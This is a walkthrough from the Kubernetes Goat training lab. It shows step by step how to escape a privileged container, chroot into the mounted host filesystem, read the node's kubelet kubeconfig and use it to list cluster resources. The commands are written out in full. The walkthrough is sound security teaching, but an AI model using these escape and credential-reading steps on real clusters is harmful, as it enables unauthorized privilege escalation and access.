# Setup of Kubernetes Goat, from https://madhuakula.com/kubernetes-goat/

The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access

After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as /host-system is mounted

```
capsh --print
```

```
mount
```

Now you can explore the mounted file system by navigating to the /host-system path

```
ls /host-system/
```

You can gain access to the host system privileges using chroot

```
chroot /host-system bash
```

The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.

```
cat /var/lib/kubelet/kubeconfig
```

Using the kubelet configuration to list the Kubernetes cluster-wide resources

```
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
```

You are able to obtain the available nodes in the Kubernetes cluster by running the following command:

```
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes
```